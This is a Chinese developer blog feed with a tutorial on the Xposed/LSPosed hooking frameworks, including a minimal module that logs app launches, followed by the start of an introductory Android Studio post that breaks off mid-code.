title="Xposed框架"></a>Xposed框架</h3><p>Xposed框架是一个Android模块化框架，允许开发者通过模块修改系统和应用行为，无需修改APK文件。它由rovo89开发，最初用于调试和测试，通过替换系统核心文件实现功能，并允许开发者使用Java代码hook方法。Xposed功能强大，可修改系统UI、性能、广告等，但安装复杂，存在风险，需要root权限。</p><p>Magisk和Xposed都是Android root工具，但Magisk采用“无系统”方式，更安全稳定，兼容性更好；Xposed功能更强大，但修改系统文件，风险更高。一些用户会结合使用两者，先用Magisk获得root权限，再安装Xposed，以兼顾安全性和功能性，但需要注意模块兼容性。</p><p>与之相对的还有CydiaSubstrate框架，不过xposed是开源项目，所以培养了更加庞大的开发者社区，网上基于Xposed框架的模块插件非常多。</p><h3 id="Xposed-Hook实现原理及缺陷"><a href="#Xposed-Hook实现原理及缺陷" class="headerlink" title="Xposed Hook实现原理及缺陷"></a>Xposed Hook实现原理及缺陷</h3><p>Xposed虽好，但也存在缺陷，比较致命的就是兼容性差。</p><p>Xposed框架的运作依赖于Android系统的Zygote进程和<code>app_process</code>，但其机制并非简单的替换。准确地说，Xposed通过替换系统默认的<code>/system/bin/app_process</code>为一个修改过的版本来实现其功能，这个修改后的<code>app_process</code>包含了Xposed框架的核心代码，以及方法Hook机制。</p><p>系统启动时，init.rc脚本启动Zygote进程，使用的是这个被Xposed替换后的<code>/system/bin/app_process</code>。因此，Zygote进程本身就加载了Xposed框架。所有应用进程都是Zygote的子进程，因此它们继承了Xposed框架的代码。</p><p>开发者编写的Xposed模块定义了Hook规则，这些模块会被Xposed框架加载，并根据规则执行Hook操作。Xposed框架会管理这些模块，并确保它们能够正确地与Zygote进程和应用进程交互。Xposed的Hook操作并非在应用运行时动态进行，而是在Zygote进程启动的早期阶段就完成了，这使得Hook操作能够影响所有从Zygote fork出的应用进程。这与在应用运行时动态Hook方法相比，效率更高，也更稳定。</p><p>听起来很不错，但问题也就出在这里。Android系统的更新迭代频繁，且不说Android本身的各种大小版本，各家手机厂商也会在原本的基础上进行魔改，这就导致Android系统版本繁多。每次系统更新都可能改变<code>app_process</code>的结构或行为。Xposed框架需要针对每次系统更新进行适配，才能保证其正常工作。如果Xposed框架没有及时更新以适应新的<code>app_process</code>，那么它就可能无法正常工作，甚至导致系统崩溃或bootloop（无限重启）。知名项目可以依赖庞大的贡献者群体及时更新，小项目跟不上版本就会慢慢废弃。</p><h3 id="EdXposed框架"><a href="#EdXposed框架" class="headerlink" title="EdXposed框架"></a>EdXposed框架</h3><p><a href="https://github.com/ElderDrivers/EdXposed">GitHub - ElderDrivers&#x2F;EdXposed: Elder driver Xposed Framework.</a></p><p>EdXposed是Xposed框架的改进版，主要解决了Xposed在高版本Android系统上的兼容性问题。Xposed通过替换核心文件<code>app_process</code>工作，这种方式在新的Android系统中容易冲突，导致不稳定甚至崩溃。而EdXposed则基于Riru项目，通过注入代码到zygote进程，避免了直接修改系统文件，从而提升了兼容性和稳定性。  两者功能相似，都允许安装模块扩展系统功能，但EdXposed在兼容性和稳定性方面显著优于Xposed。</p><h3 id="LSPosed框架"><a href="#LSPosed框架" class="headerlink" title="LSPosed框架"></a>LSPosed框架</h3><p>LSPosed是EdXposed的进一步发展，旨在提供更高的兼容性和用户体验。与EdXposed类似，LSPosed也基于Riru项目，通过注入代码到Zygote进程来实现功能扩展，避免了直接修改系统文件的问题，从而提升了稳定性。</p><p>LSPosed在模块管理方面进行了优化，提供了更直观的用户界面，使得用户可以更方便地安装和管理模块。此外，LSPosed支持无root模式，降低了使用门槛，这个特点降低了用户的使用门槛，可以拉更多人入坑。</p><blockquote><p>LSPosed仍然需要针对不同Android版本进行适配。</p></blockquote><h3 id="Zygote进程"><a href="#Zygote进程" class="headerlink" title="Zygote进程"></a>Zygote进程</h3><p>上文中反复提到Zygote进程，这个进程是什么呢？</p><p>Zygote进程是Android系统中至关重要的一个进程，它是所有Android应用程序的父进程。它在系统启动时被初始化，预加载所有应用可能用到的核心类和资源到内存中，从而在需要启动新应用时，通过fork自身快速创建新进程，继承Zygote进程的内存空间，实现高效的应用启动。这利用了Linux内核的写时复制技术，提升效率并节省内存。</p><p>Zygote进程还会显式启动System Server进程，后者负责初始化和管理各种系统服务。  由于Android系统版本差异和厂商定制，<code>app_process</code>的结构和行为可能变化，这影响了需要修改<code>app_process</code>的框架（如Xposed）的稳定性。EdXposed通过Riru项目注入zygote进程，避免直接修改<code>app_process</code>，从而提升了兼容性和稳定性。</p><h3 id="Riru"><a href="#Riru" class="headerlink" title="Riru"></a>Riru</h3><p>先贴仓库链接：<a href="https://github.com/RikkaApps/Riru">GitHub - RikkaApps&#x2F;Riru: Inject into zygote process</a>，不过两年前就归档了。</p><p>Riru是一个Magisk模块，它允许将代码注入zygote进程，而不会直接修改系统文件。这使得它在不同Android版本和厂商定制系统上具有更好的兼容性。</p><p>Riru与Android的关系在于它利用Android系统的zygote进程机制运行代码，通过系统接口或漏洞注入代码，影响zygote进程及其子进程（所有应用）的行为。Riru和Xposed都可修改应用行为，但实现方式不同：Xposed替换<code>app_process</code>，而Riru注入zygote进程，后者更安全、兼容性更好。</p><p>前面说到的EdXposed框架则依赖Riru实现功能，利用Riru提供的机制注入zygote进程，避免直接修改系统文件，从而提高稳定性和兼容性。EdXposed可视为基于Riru构建的Xposed框架替代方案，Riru提供底层机制，EdXposed在其上构建更易用的框架。</p><p>ok，先介绍到这里，更进一步的实现原理可以看这篇文档，想必会收获颇丰：<a href="https://github.com/AlienwareHe/riru-docs/blob/main/riru%E6%A8%A1%E5%9D%97%E8%A7%A3%E6%9E%90.md">riru-docs&#x2F;riru模块解析.md at main · AlienwareHe&#x2F;riru-docs · GitHub</a>。</p><h2 id="安装LSPosed"><a href="#安装LSPosed" class="headerlink" title="安装LSPosed"></a>安装LSPosed</h2><p>LSPosed仓库release地址：<a href="https://github.com/LSPosed/LSPosed/releases">Releases · LSPosed&#x2F;LSPosed</a>，安装LSPosed-Zygisk模块即可，下载zip推送到设备，然后在Magisk中作为模块安装。安装后重启。</p><blockquote><p>我前面已经配了基于Zygisk的Shamiko模块，如果切换为Riru会与Zygisk冲突，所以这里直接选择LSPosed-Zygisk模块。</p></blockquote><p>重启后，通知栏会弹出“LsPosed已加载”，点击即可进入管理界面（如果没显示，可以通过拨号键输入 <code>*#*#5776733#*#*</code> 进入LSPosed）。</p><p>进入LSPosed App，<code>设置</code> – <code>创建快捷方式</code> – 关闭 <code>状态通知</code> – 显示<code>已激活</code>，代表已成功刷入LSPosed框架。</p><p><img src="https://img.ma5hr00m.top/2025/20250112211441.png" alt="image.png"></p><h2 id="编写Xposed模块"><a href="#编写Xposed模块" class="headerlink" title="编写Xposed模块"></a>编写Xposed模块</h2><ul><li><a href="https://saucer-man.com/machine_learning/725.html">编写一个简单的xposed模块 - yanq的个人博客</a></li><li><a href="https://l0neman.github.io/2020/06/03/xposed-%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BD%BF%E7%94%A8/">Xposed 框架的使用 - l0neman 的博客</a></li><li><a href="https://lbqaq.top/p/init-xposed/">从零开始编写Xposed模块</a></li></ul><p>刚开始找到的教程很老，各种奇奇怪怪问题一堆，后面边翻文档边修，也算是磕磕绊绊写出来第一个cposed模块，实现的功能很简单，就是监测应用的启动，检测到应用启动就打印一条日志。</p><p>晚上的很多类似的教程，但有一点不好，就是不解释为什么要怎么写，我比较呆，写完之后会搜搜为什么要这么做，这里也一并附上，所以后面的内容会有点啰嗦。</p><blockquote><p>AndroidStudio版本为2024.2，设备版本为Oneplus Ace2（Android14），项目选择的是Kotlin DSL</p></blockquote><p>开发xposed模块，本质上和开发android模块是一样的，区别在于：</p><ul><li>让LSPosed知道我们安装的这个程序是个xposed模块；</li><li>模块里要包含有xposed的API的jar包，以实现下一步的hook操作；</li><li>这个模块里面要有对目标程序进行hook操作的方法；</li><li>要让手机上的xposed框架知道，我们编写的xposed模块中，哪一个方法是实现hook操作的，也就是hook类的入口。</li></ul><h3 id="Android-Studio新建项目"><a href="#Android-Studio新建项目" class="headerlink" title="Android Studio新建项目"></a>Android Studio新建项目</h3><p>Android Studio新建空项目，操作流程见我的上一篇文章：<a href="https://blog.kinoko.fun/2025/01/09/start-andorid-development/">浅试Android开发</a>，不同的是开发app可以选择empty activity，开发xposed模块推荐选择no activity（至少这个例子是这样的）。</p><blockquote><p>选择 “Empty Activity” 模板时，Android Studio 会为你创建一个包含基本活动（Activity）和布局文件的项目，而对下面这个xposed模块来说，这些都是不必要的，所以此处选择no activity即可，干净的项目结构也方便操作。</p></blockquote><h3 id="settings-gradle添加xposed框架依赖"><a href="#settings-gradle添加xposed框架依赖" class="headerlink" title="settings.gradle添加xposed框架依赖"></a>settings.gradle添加xposed框架依赖</h3><p>项目根目录下的settings.gradle中添加一行</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dependencyResolutionManagement &#123;  </span><br><span class="line">    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)  </span><br><span class="line">    <span class="keyword">repositories</span> &#123;  </span><br><span class="line">        google()  </span><br><span class="line">        mavenCentral()  </span><br><span class="line">        maven &#123; url <span class="string">&#x27;https://api.xposed.info/&#x27;</span> &#125;  <span class="comment">// 添加这一行即可  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Xposed模块需要依赖Xposed框架的库，而这些库不在默认的Maven仓库，通过添加 Xposed 的Maven仓库，确保Gradle能够找到并下载所需的Xposed相关依赖。</p><h3 id="模块级build-gradle添加Xposed-Framework-API"><a href="#模块级build-gradle添加Xposed-Framework-API" class="headerlink" title="模块级build.gradle添加Xposed Framework API"></a>模块级build.gradle添加Xposed Framework API</h3><p>将Xposed框架所需的API库添加到项目中，以便你的模块能够使用Xposed提供的功能，例如hook。在<code>app/build.gradle</code>文件的<code>dependencies</code>段中添加以下代码：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dependencies</span> &#123;</span><br><span class="line">    compileOnly(<span class="string">&quot;de.robv.android.xposed:api:82&quot;</span>)</span><br><span class="line">    compileOnly(<span class="string">&quot;de.robv.android.xposed:api:82:sources&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>complieOnly</code>表示只在编译时使用这些库，最终生成的APK文件中不会包含这些库，从而减小APK大小；<code>de.robv.android.xposed:api:82</code>是Xposed API库，<code>82</code>代表版本号，你需要根据你使用的EdXposed版本选择合适的版本号，如果版本号不匹配，模块可能无法正常工作；<code>de.robv.android.xposed:api:82:sources</code>包含Xposed API库的源代码，方便调试和理解API的实现细节。</p><blockquote><p>这里可以不必理会版本号，直接cv即可。</p></blockquote><h3 id="arrays-xml添加模块作用域"><a href="#arrays-xml添加模块作用域" class="headerlink" title="arrays.xml添加模块作用域"></a>arrays.xml添加模块作用域</h3><p>路径为<code>app/src/main/res/values/</code>，在该目录下创建arrays.xml文件，内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">string-array</span> <span class="attr">name</span>=<span class="string">&quot;xposedscope&quot;</span> &gt;</span>  </span><br><span class="line">        <span class="comment">&lt;!-- 这里填写模块的作用域应用的包名，可以填多个。 --&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span>com.xposed.demo<span class="tag">&lt;/<span class="name">item</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">string-array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>模块作用域的主要目的是告诉Xposed框架，哪些应用程序是该模块可以影响的目标。通过在<code>arrays.xml</code>中指定应用的包名，Xposed框架能够在这些应用启动时加载你的模块，从而实现对这些应用的hook操作。</p><h3 id="AndroidManifest-xml中添加meta信息"><a href="#AndroidManifest-xml中添加meta信息" class="headerlink" title="AndroidManifest.xml中添加meta信息"></a>AndroidManifest.xml中添加meta信息</h3><p>目的是告诉LSPosed框架，这个应用程序是一个Xposed模块，并提供模块的描述信息和最低API版本要求。在<code>AndroidManifest.xml</code>文件的<code>&lt;application&gt;</code>标签内添加以下元数据：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 是否是xposed模块 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;xposedmodule&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 模块描述 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;xposeddescription&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;这是一个lsxposed demo&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 最低xposed版本号 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;xposedminversion&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;82&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 模块作用域 --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;xposedscope&quot;</span> <span class="attr">android:resource</span>=<span class="string">&quot;@array/xposedscope&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>xposedmodule=&quot;true&quot;</code>声明这是一个Xposed模块。</li><li><code>xposeddescription</code>模块的描述，会在Xposed Installer中显示。</li><li><code>xposedminversion</code>模块所需的最低Xposed API版本。 这个版本号应该与你设备上安装的EdXposed版本兼容，或者低于该版本。</li><li>作用域在上一小标题解释过了。</li></ul><h3 id="编写Hook代码"><a href="#编写Hook代码" class="headerlink" title="编写Hook代码"></a>编写Hook代码</h3><p>在MainActivity同级目录创建一个名为<code>HookDemo.kt</code>的类，实现<code>IXposedHookLoadPackage</code>接口：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xposed.demo.hookdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainHook</span> <span class="title">implements</span> <span class="title">IXposedHookLoadPackage</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> void handleLoadPackage(LoadPackageParam lpparam) throws Throwable &#123;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Loaded app: &quot;</span> + lpparam.packageName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认读者有kotlin基础，薄弱的话可以看看官方文档：<a href="https://book.kotlincn.net/text/basic-syntax.html">基本语法 · Kotlin 官方文档 中文版</a>，这里主要介绍引用的模块，首次接触会比较陌生。</p><ul><li><code>IXposedHookLoadPackage</code>：一个接口，允许开发者实现应用加载时的hook逻辑。通过实现这个接口，模块可以在特定应用被加载时执行自定义代码。</li><li><code>XposedBridge</code>：Xposed框架的核心类，提供了多种方法来进行hook和日志记录等操作。</li><li><code>XC_LoadPackage.LoadPackageParam</code>：一个类，包含了关于加载的应用程序的信息，例如包名、类加载器等。</li></ul><p>然后是MainHook类的介绍，其实有上文的包介绍就差不多清楚了：</p><ul><li><code>handleLoadPackage</code>是接口<code>IXposedHookLoadPackage</code>中定义的方法。当一个应用被加载时，Xposed框架会调用这个方法。</li><li><code>LoadPackageParam lpparam</code>参数包含了被加载应用的相关信息。</li><li><code>XposedBridge.log(...)</code>方法用于记录日志，这里记录了加载的应用的包名。通过查看Xposed的日志，开发者可以看到哪些应用被加载了。</li></ul><h3 id="指定Hook入口"><a href="#指定Hook入口" class="headerlink" title="指定Hook入口"></a>指定Hook入口</h3><p>告诉Xposed框架，你的hook代码的入口点在哪里，以便框架能够在合适的时机调用你的hook代码。在<code>app/src/main</code>目录下创建一个名为<code>assets</code>的文件夹，并在其中创建一个名为<code>xposed_init</code>的文件（<strong>没有扩展名</strong>）。 在这个文件中，写入你的hook类的全限定名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.xposed.demo.hookdemo.MainHook</span><br></pre></td></tr></table></figure><h3 id="安装并测试"><a href="#安装并测试" class="headerlink" title="安装并测试"></a>安装并测试</h3><p>以上内容全部搞定之后就可以build项目为apk安装包了，打包出来后可以先使用debug版本的安装包，可以使用adb install 绝对路径直接安装到设备上</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install C:\Users\&#123;YOUR_USERNAME&#125;\AndroidStudioProjects\HookDemo\app\build\outputs\apk\debug\app<span class="literal">-debug</span>.apk</span><br></pre></td></tr></table></figure><p>安装好之后在LSPosed中启用该HookDemo模块，勾选应用的app，然后重启手机应用个更改，然后使用数据线连接设备和电脑后，在电脑命令行中监听带有特征值的日志信息（其实就是拼接的特殊字符串），我们的Hook代码中是<code>Loaded app</code>：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat | <span class="built_in">Select-String</span> <span class="string">&quot;Loaded app&quot;</span></span><br></pre></td></tr></table></figure><p>开始监听后在移动设备上启动对应app，即可观察到日志信息。</p><hr><p>我本来是想做个移动端智能助手，读系统消息以及检测部分应用的使用情况，喂给预设好的AI再给出一些反馈什么的，结果写xposed模块的时候发现普通android app就可以实现读取系统通知栏里通知的功能，hook反而没必要了😭。</p><p>不过也好，有个契机了解了点Android Hook的知识。如果智能助手的项目能接着往下推的话，Hook相关知识也不是完全用不上，比如当我点开某些应用时可以给出反馈，也不错~</p>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Xposed </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅试Android开发</title>
      <link href="/2025/01/09/2025/start-andorid-development/"/>
      <url>/2025/01/09/2025/start-andorid-development/</url>
      
        <content type="html"><![CDATA[<p>Android是由Google主导开发的一个基于Linux内核的开源操作系统，专为移动设备设计，如智能手机、平板电脑和智能穿戴设备。它提供了一个用户友好的界面，支持多种应用程序，用户可以通过Google Play商店下载和安装应用。Android的架构包括应用层、应用框架、库和Linux内核，允许开发者使用Java、Kotlin等编程语言创建应用。由于其开源特性，Android吸引了大量开发者和设备制造商，形成了一个庞大的生态系统，支持多种硬件平台和设备类型，使其成为全球最流行的移动操作系统之一。</p><p>本篇是打打基础，因为想尝试编写Android Hook，所以先补充基本的Android开发知识。</p><p>环境为windows10.</p><h2 id="基础环境配置"><a href="#基础环境配置" class="headerlink" title="基础环境配置"></a>基础环境配置</h2><h3 id="安装Android-Studio"><a href="#安装Android-Studio" class="headerlink" title="安装Android Studio"></a>安装Android Studio</h3><p>先安装Jetbrains Toolbox，然后使用Toolbox安装Android Studio，非常省心，安装完成后点点点全部同意即可，新版本没有很复杂的配置选项。在Toolbox登录Jetbrains账户，会直接同步登录到对应的IDE，也不需要额外再登遍账户了。</p><h3 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h3><p>windows的包管理工具已经相对成熟了，很好用。所以摒弃之前手动配置java环境的方法，直接使用scoop解决这一切，包括java的安装和java版本管理。</p><p><img src="https://img.ma5hr00m.top/2025/20250109183121.png" alt="image.png"></p><p>直接看下面几个指令即可，用过其他包管理工具的话直接就明白了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加Buceket</span></span><br><span class="line">scoop add bucket java</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索openjdk</span></span><br><span class="line">scoop search openjdk</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装jdk8</span></span><br><span class="line">scoop install openjdk8-redhat</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装jdk17</span></span><br><span class="line">scoop install openjdk17</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换环境为jdk8</span></span><br><span class="line">scoop reset openjdk8-redhat</span><br></pre></td></tr></table></figure><h2 id="使用Android-Studio创建Demo"><a href="#使用Android-Studio创建Demo" class="headerlink" title="使用Android Studio创建Demo"></a>使用Android Studio创建Demo</h2><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p>New Project，选择空白项目，然后点点点Next+Finish即可。中间有个配置页，默认使用Kotlin语言，编写简单demo的话可以什么都不改，我Project Name更改为了Demo。</p><p><img src="https://img.ma5hr00m.top/2025/20250109183604.png" alt="image.png"></p><p>Finish之后弹出工作区页面完成空白项目创建。</p><h3 id="创建虚拟机并运行demo"><a href="#创建虚拟机并运行demo" class="headerlink" title="创建虚拟机并运行demo"></a>创建虚拟机并运行demo</h3><p>在介绍项目结构之前，先创建一个开发测试用的Android虚拟机，创建位置为菜单栏-Tools-Device Manager，点击后右侧开启设备管理页面，选择Medium Phone API 35创建虚拟机，稍等片刻即可。</p><p><img src="https://img.ma5hr00m.top/2025/20250109185028.png" alt="image.png"></p><p>Android Studio的虚拟机自定义程度比较高，也可以选择使用WIFI无线连接设备，这里还不急，一会儿打包应用到手机上的时候再搞，开发阶段可以先用用虚拟机。</p><p>事不宜迟，点击菜单栏-Run-Run ‘app’，可以直接将当前项目发布到手机上查看效果。</p><p><img src="https://img.ma5hr00m.top/2025/20250109185522.png" alt="image.png"></p><p>本地构建打包为apk再发布到自己手机上的流程与这个差别较大，后面再说。</p><h3 id="empty-activity项目结构介绍"><a href="#empty-activity项目结构介绍" class="headerlink" title="empty activity项目结构介绍"></a>empty activity项目结构介绍</h3><ul><li><code>.gradle</code>文件夹包含Gradle构建工具的相关文件，Gradle是Android项目的构建系统，负责依赖管理和构建过程。</li><li><code>main</code>：这是主要的代码和资源目录。它包含：<ul><li><code>java</code>：存放Java或Kotlin源代码的目录，通常会有一个与应用包名相对应的子目录。在空项目中，默认会有一个<code>MainActivity</code>类，这是应用的入口点。</li><li><code>res</code>：存放应用资源的目录，包括图像、布局文件、字符串等。常见的子目录有：<ul><li><code>drawable</code>：存放图像资源。</li><li><code>mipmap</code>：存放应用图标的不同分辨率版本。</li><li><code>values</code>：存放字符串、颜色、样式等资源的XML文件。</li><li><code>xml</code>：可以存放其他XML配置文件。</li></ul></li></ul></li><li><code>test</code>：用于存放本地单元测试代码，这些测试通常在JVM上运行。</li><li><code>AndroidManifest.xml</code>是Android应用的核心配置文件，类似于一个注册表，定义了应用的基本信息和组件。这个文件包含了应用的包名、版本信息、权限声明、应用组件（如活动、服务、广播接收器和内容提供者）的注册，以及其他重要的配置信息。</li></ul><p>此处提到了一个重要概念，即<strong>活动（Activity</strong>）。</p><p>在<code>AndroidManifest.xml</code>中，每个活动都需要在此注册，以便系统能够识别和管理它们。注册活动时，开发者可以指定活动的名称、启动模式、主题、图标等属性。此外，开发者还可以声明应用所需的权限，例如访问网络、读取联系人等。</p><p>在Android开发中，活动是用户界面的一个重要组成部分，代表了应用中的一个单一屏幕。每个活动都可以包含用户界面元素，如按钮、文本框和图像等，用户与这些元素进行交互。活动的生命周期由系统管理，开发者可以通过重写生命周期方法（如<code>onCreate</code>、<code>onStart</code>、<code>onResume</code>、<code>onPause</code>、<code>onStop</code>和<code>onDestroy</code>）来处理活动的创建、显示、隐藏和销毁等状态。</p><p>活动之间可以通过意图（Intent）进行交互，意图是一种消息机制，用于启动新的活动或与其他应用组件进行通信。通过这种方式，Android应用可以实现多屏幕的用户体验，允许用户在不同的活动之间导航。</p><h2 id="继续试探"><a href="#继续试探" class="headerlink" title="继续试探"></a>继续试探</h2><h3 id="编写app样式"><a href="#编写app样式" class="headerlink" title="编写app样式"></a>编写app样式</h3><p>Android Studio初始化的空项目中应该是没有控制页面样式的文件，简单搜了搜是<code>main/res/layout/activity_main.xml</code>，手动创建，点进去后发现Android Studio提供了拖拽式可视化的编写前端页面的工具，感觉非常强大。</p><p><img src="https://img.ma5hr00m.top/2025/20250109192429.png" alt="image.png"></p><p>欸这个时候就要问了，不想用这种拖拽式的工具，想用代码写样式怎么办？点击<code>ctrl+b</code>即可直接切换到code页面。在编辑区的右上角有三个按钮，分别代表code、spilit和design模式，按自己需求切换即可。</p><p><code>layout/activity_main.xml</code>文件是Android应用中用于定义用户界面的布局文件。它描述了在特定活动中显示的视图和布局结构。通过XML格式，开发者可以直观地定义界面的各个元素及其属性。我感觉很类似传统前端开发中的HTML。</p><p>这里留个示范，在布局容器里添加了文本试图和按钮，并通过<code>layout_gravity</code>属性实现居中布局：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:padding</span>=<span class="string">&quot;16dp&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/textView&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;Hello, World!&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">&quot;24sp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;Click Me&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="MainActivity主活动"><a href="#MainActivity主活动" class="headerlink" title="MainActivity主活动"></a>MainActivity主活动</h3><p><code>MainActivity</code>通常是Android应用的主活动，作为应用的入口点。它在应用启动时首先被创建，负责初始化应用的界面和逻辑。<code>MainActivity</code>的地位非常重要，因为它通常是用户首次与应用交互的地方，承载着应用的主要功能和内容。</p><p>而我们创建的安卓应用的入口就是<code>main/java/xxx/MainActivity.kt</code>，这里列出代码：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 